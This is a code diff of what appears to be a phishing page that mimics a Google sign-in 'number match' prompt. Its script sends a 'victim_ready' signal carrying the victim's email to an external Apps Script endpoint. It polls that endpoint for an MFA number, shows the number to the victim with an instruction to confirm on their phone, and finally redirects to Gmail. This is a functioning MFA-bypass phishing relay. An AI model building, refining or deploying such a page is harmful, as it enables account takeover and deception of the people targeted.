@@ -29,8 +29,7 @@
     }
     .logo svg { width: 48px; height: 48px; margin-bottom: 24px; }
     .avatar { 
-      width: 64px; 
-      height: 64px; 
+      width: 64px; height: 64px; 
       background: #1a73e8; 
       color: white; 
       border-radius: 50%; 
@@ -45,28 +44,19 @@
       border: 8px solid #e8eaed; 
       border-top: 8px solid #1a73e8; 
       border-radius: 50%; 
-      width: 60px; 
-      height: 60px; 
+      width: 60px; height: 60px; 
       animation: spin 1s linear infinite; 
       margin: 0 auto 24px; 
     }
-    @keyframes spin { 
-      0% { transform: rotate(0deg); } 
-      100% { transform: rotate(360deg); } 
-    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     h1 { font-size: 24px; margin: 0 0 16px; }
     .status { font-size: 16px; color: #5f6368; line-height: 1.5; margin-bottom: 32px; }
     .prompt-section { display: none; margin-top: 24px; }
     .number-box { 
-      font-size: 120px; 
-      font-weight: bold; 
-      color: #1967d2; 
-      background: #e3f2fd; 
-      width: 240px; 
-      height: 160px; 
-      line-height: 160px; 
-      margin: 32px auto; 
-      border-radius: 16px; 
+      font-size: 120px; font-weight: bold; 
+      color: #1967d2; background: #e3f2fd; 
+      width: 240px; height: 160px; line-height: 160px; 
+      margin: 32px auto; border-radius: 16px; 
       border: 4px solid #1967d2; 
       box-shadow: 0 4px 12px rgba(0,0,0,0.15); 
     }
@@ -101,11 +91,12 @@
 
   <script>
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzMcaCzi5Cja5WzhFKhl6O2ypdS8BfWwkyoxIenPP22LjqlMpT0pMbEkUAkiK9ZzZFW/exec";
+
     let email = localStorage.getItem("demoEmail") || "someone@example.com";
     document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
 
     const statusEl = document.getElementById("status");
-    const debugEl = document.getElementById("debugMsg");
+    const debugEl  = document.getElementById("debugMsg");
     const numberEl = document.getElementById("matchNumber");
 
     function log(msg) { 
@@ -113,7 +104,7 @@
       debugEl.textContent = msg; 
     }
 
-    // Send victim_ready signal (fire-and-forget)
+    // 1. Send victim_ready signal
     const readyParams = new URLSearchParams({
       action: "victim_ready",
       email: email,
@@ -125,70 +116,67 @@
       method: "GET",
       mode: "no-cors",
       cache: "no-cache"
-    }).catch(e => {
-      console.error("Ready signal failed:", e);
-    });
+    }).catch(e => console.error("victim_ready send failed:", e));
 
-    // Poll for prompt number – FIXED & VERBOSE VERSION
+    // 2. Poll for the prompt number
     setInterval(async () => {
       try {
         const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
-        
-        console.log("[POLL START] Fetching:", url);
+        console.log("[POLL] Requesting:", url);
 
         const response = await fetch(url, {
           method: 'GET',
           cache: 'no-cache',
-          mode: 'cors',
-          headers: { 'Accept': 'application/json' }
+          mode: 'cors',                // ← must be cors to read the body
+          redirect: 'follow'
         });
 
-        console.log("[POLL] Status:", response.status);
+        console.log("[POLL] Status code:", response.status);
 
         if (!response.ok) {
-          console.warn("[POLL] Not OK:", response.status, response.statusText);
-          return;
+          throw new Error(`HTTP error ${response.status}`);
         }
 
-        const rawText = await response.text();
-        console.log("[POLL RAW TEXT]:", rawText);
+        const raw = await response.text();
+        console.log("[POLL] Raw response:", raw);
 
         let data;
         try {
-          data = JSON.parse(rawText);
-          console.log("[POLL PARSED]:", data);
-        } catch (err) {
-          console.error("[POLL PARSE ERROR]:", err, "Raw:", rawText);
+          data = JSON.parse(raw);
+          console.log("[POLL] Parsed data:", data);
+        } catch (parseErr) {
+          console.error("[POLL] JSON parse failed:", parseErr);
+          debugEl.textContent = "Parse error - check console";
           return;
         }
 
         const number = data.prompt_number || data.number || "";
-        console.log("[POLL NUMBER FOUND]:", number);
+        console.log("[POLL] Number value:", number || "(empty)");
 
-        if (number && number.trim() !== "" && number !== "—" && number !== "null" && number !== "undefined") {
+        if (number && number.trim() !== "" && number !== "—" && number !== "null") {
           numberEl.textContent = number;
           statusEl.textContent = "Number match received – confirm on your phone";
-          log(`Displayed prompt: ${number}`);
-          console.log("[POLL SUCCESS] DOM updated to:", number);
-        } else {
-          console.log("[POLL] No valid number yet:", number || "(empty)");
+          debugEl.textContent = `Displayed: ${number}`;
+          console.log("[POLL] Successfully displayed:", number);
         }
+
       } catch (err) {
-        console.error("[POLL CRITICAL ERROR]:", err);
+        console.error("[POLL] Critical error:", err);
+        debugEl.textContent = "Polling error: " + err.message;
       }
     }, 4000);
 
-    // Show prompt section after delay
+    // Show prompt UI after delay
     setTimeout(() => {
       document.getElementById("loading").style.display = "none";
       document.getElementById("prompt-section").style.display = "block";
       statusEl.textContent = "Waiting for number match...";
     }, 6000);
 
-    // Timeout redirect
+    // Auto-redirect after timeout
     setTimeout(() => window.location.href = "https://mail.google.com/", 90000);
   </script>
 </body>
 </html>
 
-
+  
